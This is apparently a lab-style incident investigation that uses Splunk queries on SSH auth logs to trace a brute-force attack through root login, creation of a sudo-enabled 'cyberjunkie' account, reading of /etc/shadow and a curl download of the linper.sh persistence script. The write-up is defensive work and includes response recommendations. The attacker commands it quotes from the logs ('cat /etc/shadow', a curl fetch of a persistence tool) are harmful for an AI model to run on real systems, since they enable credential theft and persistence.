# View the auth logs
In fields section, I selected the source type, to view the auth logs.
>index=* sourcetype=auth_log
<img width="1917" height="867" alt="image" src="https://github.com/user-attachments/assets/56459662-8721-4daa-bf76-ab3067304590" />

## 1. Identify Failed SSH Authentication
I searched for failed password authentication events to identify repeated unsuccessful SSH login attempts.
>index=* sourcetype=auth_log "Failed password"

Result:
The search returned multiple failed authentication attempts, indicating suspicious SSH authentication activity.

<img width="1910" height="863" alt="image" src="https://github.com/user-attachments/assets/2a787933-3db1-4b76-94b7-6c2258a8b840" />

## 2. Identify the Source IP
I extracted the source IP address from the failed authentication events and counted the number of attempts from each IP.
>index=* sourcetype=auth_log "Failed password" <br>
| rex "from (?<src_ip>\d+\.\d+\.\d+\.\d+)"  <br>
| stats count by src_ip  <br>
| sort - count

Result:
The IP 65.2.161.68 generated a high number of failed authentication attempts and was identified as the primary source of the attack activity.

<img width="1912" height="866" alt="image" src="https://github.com/user-attachments/assets/d81ed1a7-201b-4ee9-8b0b-089ef3d8328e" />

## 3. Identify Targeted User Accounts
I extracted the usernames targeted during failed SSH authentication attempts. <br>
This allowed me to determine whether the attacker was repeatedly targeting one account or attempting multiple usernames. <br>
If the username is invalid, the regex will skip the "invalid user" keyword and capture the username through "(?:invalid user)".

>index=* sourcetype=auth_log "Failed password"<br>
| rex "Failed password for (?:invalid user )?(?<user>\S+)"<br>
| stats count by user<br>
| sort - count<br>

Result: <br>
Multiple accounts were targeted, including: <br>
1.) admin  <br>
2.) backup  <br>
3.) server_adm  <br>
4.) svc_account  <br>
5.) root  <br>
This pattern is consistent with automated SSH credential-guessing activity.

<img width="1912" height="862" alt="image" src="https://github.com/user-attachments/assets/86b4b8dd-e127-45f8-947d-278515e11ab5" />

## 4. Investigate Invalid User Attempts
I searched for SSH attempts involving usernames that were not valid accounts on the system.
>index=* sourcetype=auth_log "Invalid user" <br>
| rex "Invalid user (?<username>\S+)"<br>
| dedup username<br>
| table username<br>

Result: <br>
The attacker repeatedly attempted usernames such as: <br>
1.) admin <br>  
2.) server_adm <br>
3.) svc_account  <br>
The events originated from 65.2.161.68.  <br>
The repeated use of multiple invalid usernames strengthened the indication of automated account enumeration and brute-force activity.

<img width="1912" height="868" alt="image" src="https://github.com/user-attachments/assets/78917b35-dd88-4243-89de-4a83a069d2bb" />

## 5. Investigate PAM Authentication Failures
I searched for PAM authentication failures to determine whether the SSH attempts were generating authentication failures at the system authentication layer.
>index=* sourcetype=auth_log "authentication failure"

Result: <br>
Multiple PAM authentication failures were generated from 65.2.161.68. <br>
The activity affected several accounts, including backup and root. <br>
This confirmed that the SSH activity was not limited to simple connection attempts; authentication was repeatedly being attempted and rejected. 

<img width="1917" height="867" alt="image" src="https://github.com/user-attachments/assets/e9c0e5d8-6350-47df-8bc0-162a32ddc52f" />

## 6. Investigate SSH MaxStartups Throttling
I searched for MaxStartups events to determine whether the volume of incoming SSH connections was high enough to trigger SSH connection throttling.
>index=* sourcetype=auth_log "MaxStartups"

Result: <br>
The logs showed:  "beginning MaxStartups throttling" <br>
The server also recorded:   "exited MaxStartups throttling after 00:01:08, 21 connections dropped"  <br>
This indicates that the volume of concurrent SSH connections became high enough for SSH to start dropping connections.

<img width="1901" height="862" alt="image" src="https://github.com/user-attachments/assets/4608d56f-3880-4cea-b29e-04c12c33e787" />

## 7.  Identify Successful SSH Authentication
After identifying the failed authentication activity, I searched for successful password-based SSH logins. <br>
The objective was to determine whether the attack remained unsuccessful or eventually resulted in a successful login.
>index=* sourcetype=auth_log "Accepted password"

Result: <br>
A critical event was identified: "Accepted password for root from 65.2.161.68" <br>
This occurred at approximately 06:31:40. <br>
The same source IP responsible for the failed authentication activity successfully authenticated as root.

<img width="1902" height="828" alt="image" src="https://github.com/user-attachments/assets/ad0e8556-3d2a-40bd-b951-991b30f6a529" />

## 8. Correlate Failed and Successful Authentication
I correlated failed and successful SSH authentication events by source IP. <br>
The purpose was to determine whether the IP generating the brute-force activity was also responsible for a successful login.
>index=* sourcetype=auth_log  "Accepted password"  <br>
| rex "Accepted password for (?<user>\S+)"  <br> 
| rex "from (?<src_ip>\d+\.\d+\.\d+\.\d+)"   <br>
| stats count values(user) AS users   by src_ip<br>
| sort - count

Result: <br>
The source IP 65.2.161.68 was associated with both: "Repeated failed authentication attempts" AND "Successful authentication as root"  <br>
This correlation significantly increased the severity of the incident because the activity progressed from authentication attempts to successful privileged access.

<img width="1903" height="837" alt="image" src="https://github.com/user-attachments/assets/bd376497-bb00-4662-8a8d-5e6d8fffb4b0" />

## 9.  Investigate the Root Session
I searched for root-related authentication and session events to determine what happened immediately after the successful login.
>index=* sourcetype=auth_log "user root"

Result: <br>
The logs showed: "Accepted password for root from 65.2.161.68" <br>
followed by: <br>
>session opened for user root<br>
New session 34 of user root <br>


The root session was then closed shortly afterward. <br>
A second successful root login from the same source IP occurred at approximately 06:32:44, opening session 37.

<img width="1896" height="856" alt="image" src="https://github.com/user-attachments/assets/7b482cef-b564-4eb0-9dbd-e49a72cef757" />

## 10. Investigate New User Creation
After confirming successful root access, I searched for account and group creation activity.<br>
The purpose was to determine whether the attacker created a new account after obtaining privileged access.
>index=* sourcetype=auth_log ("new user" OR "useradd" OR "groupadd")

Result: <br>
At approximately 06:34:18, the logs recorded creation of a new group and user:
>new group: name=cyberjunkie, GID=1002

and:
>new user: name=cyberjunkie, UID=1002, GID=1002

The account had:
>Home directory: /home/cyberjunkie <br>
Shell: /bin/bash

A password was subsequently set for the account.<br>
This is suspicious because the account was created shortly after the successful root login.

<img width="1896" height="857" alt="image" src="https://github.com/user-attachments/assets/4fa0f310-7fc3-43f6-bcb4-744d233ef73d" />

## 11. Investigate Privilege Assignment
Investigate Privilege Assignment
>index=* sourcetype=auth_log ("usermod" OR "sudo")

Result: <br>
The logs showed:
>usermod: add 'cyberjunkie' to group 'sudo'

The account cyberjunkie was therefore added to the sudo group.<br>
This gave the newly created account the ability to execute commands with elevated privileges.<br>
The combination of new account creation + sudo group membership is highly suspicious in the context of the preceding root compromise.

<img width="1912" height="862" alt="image" src="https://github.com/user-attachments/assets/4147016f-2121-464a-824c-7cb27966d69a" />

## 12. Confirm SSH Login Using the New Account
I checked whether the newly created account was subsequently used for SSH authentication.
>index=* sourcetype=auth_log "Accepted password"" "cyberjunkie"

Result: <br>
At approximately 06:37:34, the logs showed:
>Accepted password for cyberjunkie from 65.2.161.68

The same source IP that performed the earlier brute-force activity and successful root authentication was used to log in as the newly created cyberjunkie account.<br>
A new session was opened for this user.<br>
This strongly connects the account creation activity to the earlier attacker activity.

<img width="1903" height="857" alt="image" src="https://github.com/user-attachments/assets/aed55b00-8905-48e3-b128-110fb49da9ff" />

## 13. Investigate Sudo Activity
I searched for sudo activity after the cyberjunkie account logged in.<br>
The purpose was to identify commands executed with root privileges.
>index=* sourcetype=auth_log "sudo:"

Result:<br>
The account cyberjunkie used sudo to execute commands as root.<br>
This confirms that the newly created account was not merely created and left unused; it was actively used for privileged operations.

<img width="1900" height="872" alt="image" src="https://github.com/user-attachments/assets/b5413d39-3aec-43b4-8cb6-f262f043cfe0" />

## 14. Investigate Access to /etc/shadow
I searched for commands recorded by sudo to identify what privileged operations were performed.
>index=* sourcetype=auth_log "COMMAND="

Result:<br>
The logs recorded:
>sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow

The account cyberjunkie executed:
>cat /etc/shadow

as root.

/etc/shadow contains sensitive password-related account information, so access to this file is highly significant during an authentication compromise investigation.

<img width="1911" height="867" alt="image" src="https://github.com/user-attachments/assets/e6d4b282-99f3-48b3-bb2d-f2c715288397" />

## 15. Investigate the Download of linper.sh
I searched for the specific script download observed in the sudo command logs.
>index=* sourcetype=auth_log "linper.sh"

Result:<br>
The logs recorded:
>sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

The cyberjunkie account used sudo/root privileges to download linper.sh from GitHub.

The authentication log alone does not establish exactly what the script was subsequently used for, so I treated this as **suspicious post-compromise activity** requiring further investigation rather than making a definitive claim about its purpose.

<img width="1903" height="763" alt="image" src="https://github.com/user-attachments/assets/a67554b7-69cb-40c6-b1b1-d759dc7c4850" />

## 16. Build the Incident Timeline
After investigating the individual events, I correlated the major authentication and post-authentication events chronologically.
>index=* sourcetype=auth_log <br>
("Invalid user" OR "Failed password" OR "Accepted password" OR "MaxStartups" OR "useradd" OR "groupadd" OR "usermod" OR "sudo")

Result:<br>
The investigation produced the following attack sequence:

| Time | Activity |
|---|---|
| 06:31:31 | SSH authentication activity begins from `65.2.161.68` |
| 06:31:31+ | Multiple invalid users targeted |
| 06:31:31 | SSH `MaxStartups` throttling begins |
| 06:31:33+ | Multiple failed passwords |
| 06:31:37+ | `root` authentication attempts begin |
| 06:31:40 | Successful root login from `65.2.161.68` |
| 06:31:40 | Root session opened |
| 06:32:39 | 21 SSH connections reported dropped by MaxStartups |
| 06:32:44 | Second successful root login |
| 06:34:18 | `cyberjunkie` group/user created |
| 06:34:26 | Password set for `cyberjunkie` |
| 06:35:15 | `cyberjunkie` added to `sudo` group |
| 06:37:24 | Root session closed |
| 06:37:34 | `cyberjunkie` successfully logs in from same IP |
| 06:37:57 | `cyberjunkie` uses sudo to read `/etc/shadow` |
| 06:39:38 | `cyberjunkie` uses sudo to download `linper.sh` |

<img width="1910" height="868" alt="image" src="https://github.com/user-attachments/assets/2fb7fbad-dc90-4afd-a488-88e7a1802361" />


## Final Investigation Finding

Based on the correlation of the authentication events, I identified a progression from automated SSH authentication activity to successful privileged access and subsequent post-compromise activity.

The investigation showed:

- Multiple SSH authentication attempts originated from 65.2.161.68.
- Multiple usernames were targeted.
- SSH MaxStartups throttling was triggered and 21 connections were dropped.
- The same IP successfully authenticated as root.
- A new account named cyberjunkie was created.
- The new account was added to the sudo group.  
- The same source IP subsequently logged in using cyberjunkie.
- The account used sudo/root privileges to access /etc/shadow.
- The account used sudo/root privileges to download linper.sh.
  
This indicates that the incident progressed beyond a simple brute-force attempt and resulted in successful compromise followed by privileged post-compromise activity.

## Recommended SOC Response

Based on the evidence identified during the investigation, the recommended response would be:

- Block or investigate the source IP 65.2.161.68.
- Disable/remove the unauthorized cyberjunkie account after confirming it is not legitimate.
- Remove unauthorized sudo privileges.
- Reset credentials for potentially compromised accounts, especially root.
- Review /etc/shadow exposure and investigate potential credential compromise.
- Review SSH configuration and authentication controls.
- Investigate commands executed during the root sessions.
- Investigate the downloaded linper.sh script and any subsequent execution.
- Review additional system logs for persistence, lateral movement, or further compromise.
- Preserve relevant logs and evidence for incident-response analysis.

## Investigation Outcome
 
The investigation demonstrated how Splunk can be used to move from a high-level authentication alert to a complete attack narrative.

I started by identifying failed SSH authentication attempts and the attacking source IP. I then correlated the authentication failures with successful root authentication, investigated the resulting root sessions, identified creation of a new privileged account, and followed the account's subsequent sudo activity.

The final investigation showed a complete attack chain:

SSH brute-force activity → successful root authentication → account creation → sudo privilege assignment → attacker login → sensitive file access → suspicious script download














